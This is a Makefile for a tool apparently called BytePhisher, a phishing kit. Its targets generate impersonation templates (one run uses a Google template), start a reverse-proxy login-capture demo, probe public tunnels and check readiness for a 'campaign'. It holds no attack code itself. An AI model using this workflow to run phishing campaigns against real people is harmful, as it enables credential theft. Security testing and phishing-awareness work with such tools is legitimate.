# BytePhisher — common tasks. `make help` lists everything.
PY := ./.venv/bin/python
PIP := ./.venv/bin/pip

.PHONY: help venv install templates test test-fast test-unit test-integration lint run proxy clean distclean

help:
	@echo "make install      create .venv, install deps, generate templates"
	@echo "make templates    (re)generate the template library"
	@echo "make test         full suite incl. live internet/tunnel/SMTP tests"
	@echo "make test-fast    skip the live suite"
	@echo "make test-unit    the unit tier only (pure logic, no server, seconds)"
	@echo "make test-integration  the server/HTTP tier (no browser)"
	@echo "make lint         ruff check (if installed)"
	@echo "make run          local-only run on :8080 (no tunnel)"
	@echo "make proxy        reverse-proxy demo against httpbin.org on :8231"
	@echo "make probe        probe every tunneler against the real internet"
	@echo "make doctor       check this machine can run a campaign"
	@echo "make clean        remove caches/artifacts (keeps data/ and templates/)"
	@echo "make distclean    also remove .venv, data/, logs/, templates/"

venv:
	python3 -m venv .venv
	$(PIP) install -q --upgrade pip

install: venv
	$(PIP) install -q -r requirements.txt
	$(PY) tools/gen_templates.py

templates:
	$(PY) tools/gen_templates.py

test:
	$(PY) tests/run_all.py

test-fast:
	$(PY) tests/run_all.py --fast

test-integration:
	./.venv/bin/python -m pytest tests -m integration -q

test-unit:
	$(PY) -m pytest tests -m unit -q

lint:
	@$(PY) -m ruff check . || echo "ruff not installed: $(PIP) install ruff"

run:
	$(PY) bytephisher.py -o google -m test -p 8080

proxy:
	$(PY) bytephisher.py --proxy --upstream httpbin.org --login-path /forms/post \
		-p 8231 --no-tui --geo off --campaign proxy-demo -t none

probe:
	$(PY) tools/probe_tunnels.py

doctor:
	$(PY) bytephisher.py --doctor

clean:
	rm -rf **/__pycache__ .pytest_cache logs/*.log
	find . -name '*.pyc' -delete

distclean: clean
	rm -rf .venv data logs templates bin
